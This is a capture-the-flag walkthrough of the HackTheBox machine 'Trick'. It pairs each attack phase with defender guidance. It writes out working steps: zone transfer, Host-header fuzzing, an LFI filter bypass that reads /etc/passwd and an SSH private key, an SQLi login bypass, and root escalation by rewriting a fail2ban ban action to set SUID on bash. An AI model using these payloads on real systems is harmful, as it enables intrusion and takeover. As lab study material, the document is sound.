# HTB — Trick (Linux, Easy)

> Personal walkthrough & study notes. Written to understand the **concepts and
> methodology**, not just the flags. Each phase answers three questions:
> **What did I do? Why? How would a defender catch or stop it?**

---

## Box facts

| | |
|---|---|
| **Name** | Trick |
| **IP** | 10.129.91.62 |
| **OS** | Debian 10 (Buster) — fingerprinted from service banners |
| **Difficulty** | Easy |
| **Date owned** | 2026-10-26 |
| **user.txt** | `[REDACTED — retired box, capture it yourself]` |
| **root.txt** | `[REDACTED — retired box, capture it yourself]` |

**One-line summary:** DNS zone transfer leaks a naming convention → vhost
fuzzing finds a dev site → LFI with a filter bypass reads an SSH key → login as
`michael` → abuse a group-writable fail2ban config to run code as root.

---

## The mental model (read this first)

Every step below is **enabled by the output of the step before it.** I never
guessed — I followed evidence. That is the whole game:

```
recon → enumeration → the naming convention → targeted fuzzing →
LFI → filter bypass → creds (SSH key) → initial access →
local enum (id / sudo -l) → misconfig → privesc → root
```

When you get stuck on a box, the question is almost never "what exploit do I
throw?" — it's **"what did the last step actually tell me, and what does that
let me look at next?"**

---

## Phase 1 — Recon (port & service scan)

### What I did
```bash
# Full TCP sweep (connect scan — no root / passwordless sudo on my box)
nmap -sT -p- --min-rate 2000 10.129.91.62

# Targeted version + default-script scan on the open ports
nmap -sT -sV -sC -p 22,25,53,80 10.129.91.62
```

### Findings
| Port | Service | Banner |
|---|---|---|
| 22 | SSH | OpenSSH 7.9p1 Debian |
| 25 | SMTP | (postfix) |
| 53 | DNS | ISC **BIND 9.11.5** |
| 80 | HTTP | nginx 1.14.2 — "Coming Soon" holding page |

### Why
Recon is about **mapping attack surface** before touching anything. Two things
jumped out:
- Port **53 (DNS)** open on a web box is unusual and interesting — DNS servers
  leak information if misconfigured.
- Port 80 was just a "Coming Soon" page = probably **more sites hiding behind
  name-based virtual hosts.**

The banners also told me the OS (Debian 10) without me asking — version strings
are a fingerprint.

### 🛡️ Blue team
- **Minimise exposed surface.** Why is a recursive/authoritative DNS server
  reachable from the internet at all? If it must be, it should refuse zone
  transfers (see Phase 2).
- **Banner/version disclosure** hands attackers the OS and patch level for free.
  Strip or generalise `Server:` headers and service banners.
- A `-p-` sweep at `--min-rate 2000` is **noisy**: hundreds of connections to
  closed ports in seconds. An IDS (Suricata/Snort) or even simple connection-rate
  alerting flags this instantly. This is the single easiest attacker action to
  detect — most real intrusions are missed because nobody watches for it.

---

## Phase 2 — DNS enumeration (the pivot)

### What I did
```bash
# Reverse lookup against the box's own DNS
dig -x 10.129.91.62 @10.129.91.62

# Attempt a full zone transfer (AXFR) for the discovered domain
dig axfr trick.htb @10.129.91.62
```

### Findings
The AXFR **succeeded** (misconfiguration!) and dumped the zone, revealing:
- `trick.htb`
- `preprod-payroll.trick.htb`

### Why
**AXFR (zone transfer)** is meant to sync DNS records from a primary to a
secondary server. If the server doesn't restrict *who* can request it, anyone
can pull the **entire list of hostnames** — an instant map of the internal
naming scheme.

The gold here wasn't just one hostname — it was the **convention**:
`preprod-<something>.trick.htb`. That pattern is what made Phase 3 surgical
instead of blind.

### 🛡️ Blue team
- **Restrict AXFR.** In BIND: `allow-transfer { <secondary IPs only>; };` (or
  `none;`). This is a one-line fix and a classic finding in every DNS audit.
- Zone transfers from unexpected source IPs should be **logged and alerted** —
  a legit secondary is a known, small set of IPs; anything else is recon.

---

## Phase 3 — Virtual host discovery (targeted fuzzing)

### What I did
```bash
# /etc/hosts so my box resolves the vhosts to the target
# 10.129.91.62  trick.htb preprod-payroll.trick.htb preprod-marketing.trick.htb

# Fuzz the HOST HEADER using the leaked convention, not blind subdomains
ffuf -u http://10.129.91.62/ -H "Host: preprod-FUZZ.trick.htb" \
     -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -fs 5480
```

### Findings
- `preprod-marketing.trick.htb` → **Size 9660** (distinct from the baseline
  `5480` "Coming Soon" response).

### Why
This is **name-based virtual hosting**: one IP/nginx serves different sites
depending on the `Host:` header. The server shows "Coming Soon" for unknown
hosts, so I:
1. Fuzzed the `Host:` header (not DNS), because the sites are selected by that
   header.
2. Used the leaked `preprod-FUZZ` convention so I only tested *plausible*
   names — far fewer requests, far more signal.
3. Used **`-fs 5480`** (filter by size) to hide the default "Coming Soon"
   responses. Anything with a *different* body size is a real, distinct site.
   This "baseline-and-filter" technique is the core of all fuzzing.

> Earlier question I had: *"why fuzz when I already got into payroll via SQLi?"*
> Because one foothold isn't the goal — **enumerate the whole surface.** The
> marketing vhost (not payroll) is what carried the working LFI. Don't tunnel on
> the first interesting thing.

### 🛡️ Blue team
- **Don't expose pre-production/staging** (`preprod-*`, `dev-*`, `staging-*`) to
  the internet. These skip security review and are a top real-world breach
  vector. Firewall them or require VPN.
- Web Application Firewall + **rate limiting**: ffuf sends thousands of requests
  with odd `Host:` headers. Alert on request-rate spikes and on requests for
  `Host:` values that aren't in your known-good list.

---

## Phase 4 — Local File Inclusion + filter bypass

### What I did
```bash
# The marketing site loads pages via ?page= — classic LFI candidate
# Naive attempts returned blank (a filter strips "../"):
curl 'http://preprod-marketing.trick.htb/index.php?page=/etc/passwd'            # blank
curl 'http://preprod-marketing.trick.htb/index.php?page=../../../../etc/passwd' # blank

# Bypass the NON-RECURSIVE "../" filter with ....// → collapses to ../
curl 'http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//etc/passwd'
```

### Findings
- `/etc/passwd` dumped → only real human login was
  `michael:x:1001:1001::/home/michael:/bin/bash`.
- Then read michael's private key:
  ```
  index.php?page=....//....//....//....//....//home/michael/.ssh/id_rsa
  ```
  → OpenSSH private key, comment `michael@trick`.

### Why — three concepts
1. **LFI:** the code is effectively `include($_GET['page'])`. Whatever path you
   supply, PHP tries to include. Point it at system files.
2. **The `../` filter bypass:** the app strips the string `../` **once, without
   repeating.** So I fed it `....//`:
   - Server sees `....//`, removes the inner `../`, and what's **left** is `../`.
   - Net result: a working traversal sequence the filter *created* by cleaning.
   - Lesson: a filter that doesn't loop until the string stops changing is
     bypassable. (Same idea defeats many naive sanitizers.)
3. **Why 5× `....//`?** Each `../` climbs one directory. I didn't know the exact
   depth of the web root, so I added a few extra. **Climbing past `/` is
   harmless** — `/` is its own parent, so extra `../` just sit at root. Too few
   fails; too many is safe. 5 was "comfortably deep enough."

### 🛡️ Blue team
- **Never `include()` user input.** Use an allow-list: map `?page=about` to a
  fixed server-side path, reject anything not on the list.
- If you must sanitize, **loop until the input stops changing**, or (better)
  canonicalize the path (`realpath`) and verify it stays inside the intended
  directory.
- WAF rules for traversal signatures (`../`, `....//`, `%2e%2e`) catch the easy
  attempts; log and alert on them. Requests pulling `/etc/passwd` or `.ssh/id_rsa`
  are unambiguous indicators of compromise — **page on those.**

---

## Phase 5 — Initial access (SSH as michael)

### What I did
```bash
# The key was created via sudo earlier, so it was root-owned → fix ownership first
sudo chown kali:kali loot/id_rsa
chmod 600 loot/id_rsa                 # SSH refuses keys that are group/world readable

ssh -i loot/id_rsa michael@10.129.91.62
cat ~/user.txt                        # [REDACTED — retired box, capture it yourself]
```

### Why
- **`chmod 600`**: OpenSSH deliberately refuses a private key other users could
  read — a safety check. The key must be owner-only.
- A stolen private key = **passwordless login as that user**. This is why key
  theft (via LFI, backups, git history, etc.) is so valuable.

### 🛡️ Blue team
- **Protect private keys**: passphrase-encrypt them, and never leave them
  readable by a web-exposed process.
- **Log SSH logins** (`auth.log`). A key-based login from a brand-new source IP,
  especially right after web-app traversal alerts, is a correlation goldmine for
  a SIEM.

---

## Phase 6 — Privilege escalation (fail2ban abuse)

### What I did
```bash
# Always the first two privesc questions:
id          # groups=1001(michael),1002(security)
sudo -l     # (root) NOPASSWD: /etc/init.d/fail2ban restart
```
Then I found the fail2ban action dir was **group-writable by `security`**:
```
/etc/fail2ban/action.d/   drwxrwx--- root security
```
The `.conf` files inside were `root:root -rw-r--r--` (not file-writable), but
**write permission on a directory lets you delete and recreate files in it,
regardless of who owns them.** So I replaced the SSH jail's ban action:
```bash
# in /etc/fail2ban/action.d/iptables-multiport.conf
actionban = chmod +s /bin/bash
```
Armed it, then triggered a ban:
```bash
sudo /etc/init.d/fail2ban restart          # loads my poisoned config

# Generate ≥5 failed SSH logins so the jail bans my IP (forcing PASSWORD auth
# so attempts actually FAIL — the key would succeed and not count):
ssh -o PubkeyAuthentication=no michael@10.129.91.62   # wrong password ×3, repeat
```
On the ban, **root** executed `actionban` → `chmod +s /bin/bash`:
```bash
ls -l /bin/bash        # -rwsr-sr-x  (SUID set!)
/bin/bash -p           # -p keeps euid=root instead of dropping it
whoami                 # root
cat /root/root.txt     # [REDACTED — retired box, capture it yourself]
```

### Why — the chain of concepts
1. **`id` + `sudo -l` first, always.** They reveal group memberships and sudo
   rights — the two most common privesc vectors — in two commands.
2. **Group membership matters:** being in `security` gave write access to the
   fail2ban action directory.
3. **Directory write ≠ file write.** You can't edit a root-owned file you can't
   write — but if you can write the *directory*, you can `rm` it and recreate
   your own version. This is a subtle, powerful Unix permission concept.
4. **fail2ban runs `actionban` as root** whenever it bans an IP. So if you
   control the action script, you control a root command. The payload
   `chmod +s /bin/bash` sets the **SUID bit** so bash runs as its owner (root).
5. **Why `iptables-multiport.conf`?** Because `jail.conf` sets
   `banaction = iptables-multiport` for the SSH jail by default — that's the
   file fail2ban actually invokes on a ban. Poison the one that runs.
6. **`bash -p`** keeps the effective UID = root (normally bash drops privileges
   for safety); that's what turns the SUID bit into an actual root shell.
7. **Trigger must FAIL:** I forced `PubkeyAuthentication=no` so my attempts used
   a password and *failed* — a successful key login wouldn't be logged as a
   failure and wouldn't count toward the ban threshold.

### 🛡️ Blue team
- **Least privilege on config dirs.** `/etc/fail2ban/action.d` should be
  `root:root 0750` or stricter — no non-root group should write there. This one
  misconfigured group (`security`) was the entire privesc.
- **Audit SUID binaries.** `find / -perm -4000 -type f 2>/dev/null` run on a
  schedule; a newly-SUID `/bin/bash` is a screaming red flag. Tripwire/AIDE file
  integrity monitoring would alert the instant bash's mode changed.
- **Be careful handing out `sudo` on service-control scripts.** `fail2ban
  restart` sounds harmless, but combined with a writable config it's full root.
- **fail2ban defending fail2ban:** ironic but real — a security tool became the
  privesc because its action scripts were writable. Any process that runs
  attacker-influenced files as root is a liability.

---

## Credentials & artifacts collected

| Item | Value / location |
|---|---|
| michael SSH key | `loot/id_rsa` (comment `michael@trick`) |
| SQLi login bypass (payroll) | `admin' OR 1=1-- -` (partial rabbit hole) |
| user.txt | `[REDACTED — retired box, capture it yourself]` |
| root.txt | `[REDACTED — retired box, capture it yourself]` |

---

## What I left behind (cleanup / detection footprint)

On a **real engagement** you note these in the report and, with client sign-off,
restore state:
- `/bin/bash` left **SUID** → a persistent root backdoor. Would be reverted:
  `chmod u-s,g-s /bin/bash`.
- Poisoned `/etc/fail2ban/action.d/iptables-multiport.conf` (note: HTB's reset
  cron reverts it anyway).
- **Logs that tell the story:** my port scan (connection spikes), traversal
  requests in nginx logs, failed SSH bursts + the ban event in
  `fail2ban.log`/`auth.log`. A defender reading these can reconstruct the entire
  chain — which is exactly the point of the Blue-team notes above.

---

## Lessons to keep

1. **Follow the evidence, don't guess.** Every step was unlocked by the previous
   step's output.
2. **Enumerate fully — don't tunnel** on the first foothold (payroll SQLi wasn't
   the way in; marketing LFI was).
3. **Baseline-and-filter** is the heart of fuzzing (`-fs`).
4. **Filters that don't loop are bypassable** (`....//`).
5. **Directory write ≠ file write** — a permission subtlety with huge impact.
6. **Anything that runs attacker-controlled files as root is game over** —
   fail2ban here, but the pattern is everywhere (cron, systemd, SUID, PATH).
7. **`id` and `sudo -l` are always the first two privesc commands.**
8. **Every offensive action leaves a defensive signal.** Learning to read both
   sides makes you dangerous in both directions.
